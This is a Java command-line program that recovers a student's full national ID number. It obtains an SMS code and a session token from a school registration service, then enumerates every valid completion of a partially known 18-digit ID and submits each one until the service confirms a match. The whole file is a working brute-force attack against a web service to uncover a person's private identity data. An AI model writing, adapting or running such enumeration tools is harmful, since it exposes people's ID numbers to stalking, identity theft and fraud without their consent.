import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.Properties;

import org.apache.http.client.protocol.HttpClientContext;
import org.apache.http.impl.client.CloseableHttpClient;

import util.Anesting;
import util.Brower;
import util.Http1GetRandomCode;
import util.Http2IdentificationPhone;
import util.Http3RegiterInfo;
import util.Http4GetPhoneNumber;
import util.LoadConfig;


public class TongJiHelper1 {
	public static void main(String[] args) {
		try {
			CloseableHttpClient httpclient = Brower.getCloseableHttpClient();
			HttpClientContext httpClientContext = Brower.getHttpClientContext();

			LoadConfig config = new LoadConfig();
			Properties prop = config.getProp();
			
			String personName = "";
			String phoneNo = prop.getProperty("smsno");
			String identityNo = "";
			String personNo = "";
			String code = "";
			String token = "";

			BufferedReader br = new BufferedReader(new InputStreamReader(System.in));

			System.out.println("Do you have token? if yes pls input it here(if you donot know, just enter):");
			token = br.readLine();
			if(token!=null&&token.length()==32) {
				System.out.println("Pls input student number:");
				personNo = br.readLine();
			}
			else {
				Http1GetRandomCode getCode = new Http1GetRandomCode(httpclient, httpClientContext, phoneNo);
				getCode.execute();
				System.out.println("start to get the random code,please wait 10s");
		
				Http4GetPhoneNumber getPhCode = new Http4GetPhoneNumber(httpclient, httpClientContext, prop.getProperty("smsurl"));
				getPhCode.execute();
				code = getPhCode.getRandomCode();
				System.out.println("random code is "+code);
				System.out.println("Pls input student number:");
				personNo = br.readLine();
				Http2IdentificationPhone idPh = new Http2IdentificationPhone(httpclient, httpClientContext, phoneNo, code, personNo);
				idPh.execute();
				token = idPh.getToken();
				System.out.println("token is "+token);
				if(token==null) {
					System.out.println("fail to get token, please retry");
					System.exit(0);
				}
			}
			
			System.out.println("Pls input student name:");
			personName = br.readLine();

			System.out.println("Pls input ID prefix (fixed length 18, the unknown field input ?, Ex:3206821996????175X):");
			identityNo = br.readLine();
			
			Anesting an = new Anesting();
			ArrayList<String> correctIds = an.validateID(identityNo);
			for (String id : correctIds) {
				System.out.println("Test "+id);
				Http3RegiterInfo post = new Http3RegiterInfo(httpclient, httpClientContext, personName, id, phoneNo, personNo, token);
				post.execute();
				if(post.isFound()) {
					System.out.println("Congratulations, info recovered.");
					System.out.println("<Name:"+personName+"|"+"personNo:"+personNo+"|"+id+">");
					break;
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
		}

	}
}
